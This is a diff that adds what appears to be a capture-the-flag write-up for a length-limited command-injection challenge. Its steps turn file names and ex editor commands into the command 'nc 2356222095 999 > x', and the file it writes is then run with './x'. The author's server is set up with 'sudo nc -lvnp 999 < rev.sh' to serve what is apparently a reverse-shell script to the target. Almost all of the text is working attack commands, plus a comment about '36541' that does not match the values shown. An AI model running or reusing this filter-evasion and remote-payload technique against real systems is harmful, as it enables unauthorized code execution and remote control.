@@ -1,0 +1,75 @@
+nc 2356222095 999 > x
+./x
+
+My server
+	sudo nc -lvnp 999 < rev.sh
+
+stage 1: create files for the "parts" that we need
+>nc
+>23
+>562
+>220
+>95
+>999
+>\>
+ls>x
+
+cat x
+	220
+	23
+	562
+	95
+	999
+	>
+	nc
+	x
+
+stage 2: 
+
+>2j! # join the 2nd and 3rd line with space, producing 36541 (first part of ip)
+>w   # save the file ("write")
+ls>z # write ex commands into file z
+>ex  # create the ex file for the following command
+*x<z # runs ex x < z to execute `ex` on the file `x` with commands read from `z`
+
+cat x
+	220
+	        23562
+	95
+	999
+	>
+	nc
+	x
+
+>1m2 # move the first line to after line 2
+
+# these commands indent the lines 3 (end of ip), 4 (>) and 6 (x) so that when we join them without space later, 
+# there's still space between them
+>3\>
+>4\>
+>5m0 # move 5th line (nc) to first line
+>6\>
+	
+ls>z
+*x<z # run ex again
+
+cat x
+	nc
+	        23562
+	22095
+	        999
+	        >
+	                x
+
+
+>%j! # join all lines directly, not adding additional space
+>%wq # write and quit
+
+ls>z
+*x<z
+
+cat x
+nc      2356222095      999     >               x
+
+./x
+./x
